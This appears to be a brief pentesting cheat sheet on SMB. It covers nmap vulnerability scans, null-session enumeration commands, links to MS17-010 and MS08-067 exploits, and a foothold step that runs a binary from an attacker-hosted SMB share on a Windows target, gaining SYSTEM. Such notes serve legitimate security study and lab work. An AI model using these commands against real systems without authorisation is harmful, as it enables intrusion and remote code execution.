# Intro
Following Ressources contain information about SMB protocol and its vulnerabilities:
* MS info: https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview
* Pentesting SMB: https://book.hacktricks.xyz/pentesting/pentesting-smb

# Reconnaisance

* nmap scripts for vulnerability enumeration: `ls /usr/share/nmap/scripts/ | grep smb | grep vuln`
* enumeration: `nmap --script smb-vuln* -p 139,445 -Pn ip` 
* OS enumeration: `nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1`

## **CrackMapExec**: used for basic SMB enumeration

* Null Session:
```
crackmapexec smb ip_addr -u '' -p ''
smbmap -u '' -H ip
smbmap -u invalid -H ip
smbclient -N -L //ip
```
#Exploitation

* Polpular exploits:

https://github.com/worawit/MS17-010

https://github.com/andyacer/ms08_067

# Foothold
Typically you get system shell but in case further foothold for lateral movement is needed you can proceede with opening SMB share on attacking maching and upload anything you want.

```
root@kali# locate whoami.exe
/usr/share/windows-binaries/whoami.exe
```
`root@kali# smbserver.py a /usr/share/windows-binaries/`

Get and run on windows
```
C:\WINDOWS\system32>\\10.10.14.14\a\whoami.exe
NT AUTHORITY\SYSTEM
```
